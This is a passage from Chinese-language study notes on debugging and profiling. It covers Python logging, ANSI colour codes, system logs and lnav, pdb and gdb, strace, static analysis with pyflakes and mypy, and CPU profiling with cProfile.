</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-64"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&quot;Maximum value reached&quot;</span><span class="p">)</span>
</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-65"></a>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-1"></a>$<span class="w"> </span>python<span class="w"> </span>logger.py
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-2"></a><span class="c1"># Raw output as with just prints</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-3"></a>$<span class="w"> </span>python<span class="w"> </span>logger.py<span class="w"> </span>log
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-4"></a><span class="c1"># Log formatted output</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-5"></a>$<span class="w"> </span>python<span class="w"> </span>logger.py<span class="w"> </span>log<span class="w"> </span>ERROR
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-6"></a><span class="c1"># Print only ERROR levels and above</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-7"></a>$<span class="w"> </span>python<span class="w"> </span>logger.py<span class="w"> </span>color
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-1-8"></a><span class="c1"># Color formatted output</span>
</span></code></pre></div>
<p>这会依次打印出不同形式的log.</p>
<p>我们也可以使用彩色文本来显示终端信息，使其可读性更好.</p>
<p>ls 和 grep 这样的程序会使用 <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape codes</a>，它是一系列的特殊字符，可以使您的 shell 改变输出结果的颜色.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-2-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\e[38;2;255;0;0mThis is red\e[0m</span>
</span></code></pre></div>
<p>只要终端支持真彩色(即使用RGB24位色深来表示颜色)</p>
<p>那么这个命令就会打印出红色.</p>
<p>如果想要打印其它颜色.</p>
<p>则基本语法为</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-3-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\e[38;2;R,G,BmThis is message\e[0m&quot;</span>
</span></code></pre></div>
<p>如果不支持真彩色，那么可以使用16色(4位色深)</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-4-1"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\e[31; 1mThis is red\e[0m&quot;</span>
</span></code></pre></div>
<h3 id="note-cs-tms-debugging-and-profiling-_4">第三方日志系统<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_4" title="Permanent link">&para;</a></h3>
<p>如果您正在构建大型软件系统，您很可能会使用到一些依赖，有些依赖会作为程序单独运行。如 Web 服务器、数据库或消息代理都是此类常见的第三方依赖。</p>
<p>和这些系统交互的时候，阅读它们的日志是非常必要的，因为仅靠客户端侧的错误信息可能并不足以定位问题。</p>
<p>幸运的是，大多数的程序都会将日志保存在您的系统中的某个地方。对于 UNIX 系统来说，程序的日志通常存放在 <code>/var/log</code>。例如， NGINX web 服务器就将其日志存放于 <code>/var/log/nginx</code>。</p>
<p>目前，系统开始使用 <strong>system log</strong> ，您所有的日志都会保存在这里。大多数（但不是全部的）Linux 系统都会使用 systemd，这是一个系统守护进程，它会控制您系统中的很多东西，例如哪些服务应该启动并运行。systemd 会将日志以某种特殊格式存放于 <code>/var/log/journal</code>，您可以使用 <code>journalctl</code> 命令显示这些消息。</p>
<p>类似地，在 macOS 系统中是 <code>/var/log/system.log</code>，但是有更多的工具会使用系统日志，它的内容可以使用 <code>log show</code> 显示。</p>
<p>对于大多数的 UNIX 系统，您也可以使用 <code>dmesg</code> 命令来读取内核的日志。</p>
<p>如果希望将日志加入到系统日志中，您可以使用 logger 这个 shell 程序。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-5-1"></a>logger<span class="w"> </span><span class="s2">&quot;Hello Logs&quot;</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-5-2"></a>journalctl<span class="w"> </span>--since<span class="w"> </span><span class="s2">&quot;1m ago&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Hello
</span></code></pre></div>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec5-1.png" width="300" />

<figcaption>过程</figcaption>
</figure>
<p>日志的内容可以非常的多，我们需要对其进行处理和过滤才能得到我们想要的信息。</p>
<p>如果需要对 <code>journalctl</code> 和 <code>log show</code> 的结果进行大量的过滤，那么此时可以考虑使用它们自带的选项对其结果先过滤一遍再输出。还有一些像 <code>lnav</code> 这样的工具，它为日志文件提供了更好的展现和浏览方式。</p>
<h4 id="note-cs-tms-debugging-and-profiling-lnav">lnav<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-lnav" title="Permanent link">&para;</a></h4>
<p><code>lnav</code> 是一个专为命令行设计的 <strong>高级日志文件查看与分析工具</strong>，支持实时日志跟踪、语法高亮、自动时间戳解析、日志格式识别、多文件合并分析等功能。它特别适合开发者、运维人员处理复杂的日志文件，能显著提升日志分析的效率。</p>
<p>可同时打开多个日志文件（如 <code>access.log</code>、<code>error.log</code>），并自动按时间顺序合并显示。
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-6-1"></a>lnav<span class="w"> </span>/var/log/nginx/access.log<span class="w"> </span>/var/log/nginx/error.log
</span></code></pre></div></p>
<p>类似 <code>tail -f</code>，但支持语法高亮和实时过滤：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-7-1"></a>lnav<span class="w"> </span>-f<span class="w"> </span>/path/to/logfile.log
</span></code></pre></div></p>
<ul>
<li>自动识别常见日志格式（如 Apache、Nginx、Syslog、JSON 等）。</li>
<li>对日志级别（INFO、WARNING、ERROR）进行颜色标记。</li>
<li>解析时间戳、IP 地址、URL 等结构化字段。</li>
</ul>
<p>按时间轴展示日志，支持快速跳转到指定时间点（按 <code>t</code> 键）。</p>
<ul>
<li>快速过滤特定级别的日志（如仅显示 <code>ERROR</code>）。</li>
<li>正则表达式搜索（按 <code>/</code> 输入关键字）。</li>
<li>支持 SQL 查询日志内容（需学习简单语法）。</li>
</ul>
<p>支持通过 SQL 语句对日志进行统计，例如统计 HTTP 状态码出现次数：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-8-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">sc_status</span><span class="p">,</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">access_log</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">sc_status</span>
</span></code></pre></div>
<h2 id="note-cs-tms-debugging-and-profiling-_5">调试器<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_5" title="Permanent link">&para;</a></h2>
<p>当通过打印已经不能满足您的调试需求时，您应该使用调试器。</p>
<p>调试器是一种可以允许我们和正在执行的程序进行交互的程序，它可以做到：</p>
<ul>
<li>当到达某一行时将程序暂停；</li>
<li>一次一条指令地逐步执行程序；</li>
<li>程序崩溃后查看变量的值；</li>
<li>满足特定条件时暂停程序；</li>
<li>其他高级功能。</li>
</ul>
<p>很多编程语言都有自己的调试器。Python 的调试器是 pdb.ipdb是一种增强版的 pdb 它使用 IPython 作为 REPL 并开启了 tab 补全、语法高亮、更好的回溯和更好的内省，同时还保留了 pdb 模块相同的接口。</p>
<p>pdb支持的命令有</p>
<ul>
<li><code>l</code>(ist) - 显示当前行附近的 11 行或继续执行之前的显示；</li>
<li><code>s</code>(tep) - 执行当前行，并在第一个可能的地方停止；</li>
<li><code>n</code>(ext) - 继续执行直到当前函数的下一条语句或者 return 语句；</li>
<li><code>b</code>(reak) - 设置断点（基于传入的参数）；</li>
<li><code>p</code>(rint) - 在当前上下文对表达式求值并打印结果。还有一个命令是 <code>pp</code> ，它使用 pprint 打印；</li>
<li><code>r</code>(eturn) - 继续执行直到当前函数返回；</li>
<li><code>q</code>(uit) - 退出调试器。</li>
</ul>
<p>对于更加底层的编程语言<a href="https://www.sourceware.org/gdb/">gdb</a>(及其改进版<a href="https://github.com/pwndbg/pwndbg">pwndbg</a>)和<a href="https://lldb.llvm.org/">lldb</a>,它们都对类 C 语言的调试进行了优化，它允许您探索任意进程及其机器状态：寄存器、堆栈、程序计数器等。</p>
<h3 id="note-cs-tms-debugging-and-profiling-_6">专门工具<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_6" title="Permanent link">&para;</a></h3>
<p>即使您需要调试的程序是一个二进制的黑盒程序，仍然有一些工具可以帮助到您。当您的程序需要执行一些只有操作系统内核才能完成的操作时，它需要使用 系统调用。有一些命令可以帮助您追踪您的程序执行的系统调用。在 Linux 中可以使用 <code>strace</code> ，在 macOS 和 BSD 中可以使用 <code>dtrace</code>。</p>
<div class="admonition info">
<p class="admonition-title">系统调用</p>
<p>系统调用是操作系统提供的一组接口，允许用户空间的程序请求操作系统内核提供的服务。这些服务包括进程控制、文件操作、系统控制和网络管理等。系统调用作为用户程序与操作系统之间的桥梁，使得用户程序无需直接与硬件交互，从而提高了程序的可移植性和系统的安全性。</p>
</div>
<h3 id="note-cs-tms-debugging-and-profiling-_7">静态分析<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_7" title="Permanent link">&para;</a></h3>
<p>有些问题是您不需要执行代码就能发现的。例如，仔细观察一段代码，您就能发现某个循环变量覆盖了某个已经存在的变量或函数名；或是有个变量在被读取之前并没有被定义。 这种情况下 <strong>静态分析</strong> 工具就可以帮我们找到问题。静态分析会将程序的源码作为输入然后基于编码规则对其进行分析并对代码的正确性进行推理。</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-1"></a><span class="kn">import</span> <span class="nn">time</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-2"></a>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-3"></a><span class="k">def</span> <span class="nf">foo</span><span class="p">():</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-4"></a>    <span class="k">return</span> <span class="mi">42</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-5"></a>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-6"></a><span class="k">for</span> <span class="n">foo</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-7"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">foo</span><span class="p">)</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-8"></a><span class="n">bar</span> <span class="o">=</span> <span class="mi">1</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-9"></a><span class="n">bar</span> <span class="o">*=</span> <span class="mf">0.2</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-10"></a><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-9-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">baz</span><span class="p">)</span>
</span></code></pre></div>
<p>例如使用<code>pyflakes</code>分析这段代码(eg.py)，会返回</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-10-1"></a>eg.py:6:5<span class="w"> </span>redefinition<span class="w"> </span>of<span class="w"> </span>unused<span class="w"> </span><span class="s1">&#39;foo&#39;</span><span class="w"> </span>from<span class="w"> </span>line<span class="w"> </span><span class="m">3</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-10-2"></a>eg.py:11:7<span class="w"> </span>undefined<span class="w"> </span>name<span class="w"> </span><span class="s1">&#39;baz&#39;</span>
</span></code></pre></div>
<p><code>mypy</code> 则是另外一个工具，它可以对代码进行类型检查。这里，<code>mypy</code> 会经过我们 <code>bar</code> 起初是一个 <code>int</code> ，然后变成了 <code>float</code>。这些问题都可以在不运行代码的情况下被发现。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-11-1"></a>eg.py:6:<span class="w"> </span>error:<span class="w"> </span>Incompatible<span class="w"> </span>types<span class="w"> </span><span class="k">in</span><span class="w"> </span>assignment<span class="w"> </span><span class="o">(</span>expression<span class="w"> </span>has<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;int&quot;</span>,<span class="w"> </span>variable<span class="w"> </span>has<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;Callable[[], Any]&quot;</span><span class="o">)</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-11-2"></a>eg.py:9:<span class="w"> </span>error:<span class="w"> </span>Incompatible<span class="w"> </span>types<span class="w"> </span><span class="k">in</span><span class="w"> </span>assignment<span class="w"> </span><span class="o">(</span>expression<span class="w"> </span>has<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;float&quot;</span>,<span class="w"> </span>variable<span class="w"> </span>has<span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;int&quot;</span><span class="o">)</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-11-3"></a>eg.py:11:<span class="w"> </span>error:<span class="w"> </span>Name<span class="w"> </span><span class="s2">&quot;baz&quot;</span><span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>defined
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-11-4"></a>Found<span class="w"> </span><span class="m">3</span><span class="w"> </span>errors<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>file<span class="w"> </span><span class="o">(</span>checked<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nb">source</span><span class="w"> </span>file<span class="o">)</span>
</span></code></pre></div>
<p>在shell工具中，我们使用了shellcheck来静态分析shell脚本,大多数的编辑器和 IDE 都支持在编辑界面显示这些工具的分析结果、高亮有警告和错误的位置。 这个过程通常称为 code linting 。风格检查或安全检查的结果同样也可以进行相应的显示。在 vim 中，有 ale 或 syntastic 可以帮助您做同样的事情。 在 Python 中， pylint 和 pep8 是两种用于进行风格检查的工具，而 bandit 工具则用于检查安全相关的问题。</p>
<p>对于风格检查和代码格式化，还有以下一些工具可以作为补充：用于 Python 的 <code>black</code>、用于 Go 语言的 <code>gofmt</code>、用于 Rust 的 <code>rustfmt</code> 或是用于 JavaScript, HTML 和 CSS 的 <code>prettier</code> 。这些工具可以自动格式化您的代码，这样代码风格就可以与常见的风格保持一致。 尽管您可能并不想对代码进行风格控制，标准的代码风格有助于方便别人阅读您的代码，也可以方便您阅读它的代码。</p>
<p>Vscode也有自动格式化代码的功能快捷键。</p>
<p>其它语言的静态分析工具可以参考<a href="https://github.com/analysis-tools-dev/static-analysis">这里</a></p>
<h2 id="note-cs-tms-debugging-and-profiling-_8">性能分析<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_8" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-tms-debugging-and-profiling-_9">时间<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_9" title="Permanent link">&para;</a></h3>
<p>和调试代码类似，大多数情况下我们只需要打印两处代码之间的时间即可发现问题</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-1"></a><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">random</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-2"></a><span class="n">n</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-3"></a>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-4"></a><span class="c1"># 获取当前时间 </span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-5"></a><span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-6"></a>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-7"></a><span class="c1"># 执行一些操作</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-8"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sleeping for </span><span class="si">{}</span><span class="s2"> ms&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-9"></a><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="mi">1000</span><span class="p">)</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-10"></a>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-11"></a><span class="c1"># 比较当前时间和起始时间</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-12-12"></a><span class="nb">print</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span>
</span></code></pre></div>
<p>不过电脑可能在同时运行其它进程，也有可能在进行等待，对于工具来说，需要区分真实时间、用户时间和系统时间。通常来说，用户时间 + 系统时间代表了您的进程所消耗的实际 CPU </p>
<ul>
<li>真实时间:程序开始到结束流失掉的真实时间，包括其他进程的执行时间以及阻塞消耗的时间（例如等待 I/O 或网络）</li>
<li>用户时间 User - CPU 执行用户代码所花费的时间；</li>
<li>系统时间 Sys - CPU 执行系统内核代码所花费的时间。</li>
</ul>
<p>例如，试着执行一个用于发起 HTTP 请求的命令并在其前面添加 time 前缀。网络不好的情况下您可能会看到下面的输出结果。请求花费了 2s 多才完成，但是进程仅花费了 15ms 的 CPU 用户时间和 12ms 的 CPU 内核时间。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-13-1"></a>$<span class="w"> </span><span class="nb">time</span><span class="w"> </span>curl<span class="w"> </span>https://missing.csail.mit.edu<span class="w"> </span><span class="p">&amp;</span>&gt;<span class="w"> </span>/dev/null
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-13-2"></a>real<span class="w">    </span>0m2.561s
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-13-3"></a>user<span class="w">    </span>0m0.015s
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-13-4"></a>sys<span class="w">     </span>0m0.012s
</span></code></pre></div>
<h3 id="note-cs-tms-debugging-and-profiling-cpu-profilers">CPU profilers<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-cpu-profilers" title="Permanent link">&para;</a></h3>
<p>大多数情况下，当人们提及性能分析工具的时候，通常指的是 CPU 性能分析工具。 CPU 性能分析工具有两种： 追踪分析器（tracing）及采样分析器（sampling）。 追踪分析器 会记录程序的每一次函数调用，而采样分析器则只会周期性的监测（通常为每毫秒）您的程序并记录程序堆栈。它们使用这些记录来生成统计信息，显示程序在哪些事情上花费了最多的时间。</p>
<p>在 Python 中，我们使用 cProfile 模块来分析每次函数调用所消耗的时间。 </p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-1"></a><span class="ch">#!/usr/bin/env python</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-2"></a>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-3"></a><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">re</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-4"></a>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-5"></a><span class="k">def</span> <span class="nf">grep</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">file</span><span class="p">):</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-6"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-7"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-8"></a>        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()):</span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-9"></a>            <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-10"></a>            <span class="n">match</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-11"></a>            <span class="k">if</span> <span class="n">match</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-12"></a>                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">line</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-13"></a>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-14"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-15"></a>    <span class="n">times</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-16"></a>    <span class="n">pattern</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-17"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">times</span><span class="p">):</span>
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-18"></a>        <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">:]:</span>
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#note-cs-tms-debugging-and-profiling-__codelineno-14-19"></a>            <span class="n">grep</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-15-1"></a>$<span class="w"> </span>python<span class="w"> </span>-m<span class="w"> </span>cProfile<span class="w"> </span>-s<span class="w"> </span>tottime<span class="w"> </span>grep.py<span class="w"> </span><span class="m">1000</span><span class="w"> </span><span class="s1">&#39;^(import|\s*def)[^,]*$&#39;</span><span class="w"> </span>*.py
</span></code></pre></div>
<p>我们可以使用下面的命令来对这段代码进行分析。通过它的输出我们可以知道，IO 消耗了大量的时间，编译正则表达式也比较耗费时间。因为正则表达式只需要编译一次，我们可以将其移动到 for 循环外面来改进性能。</p>
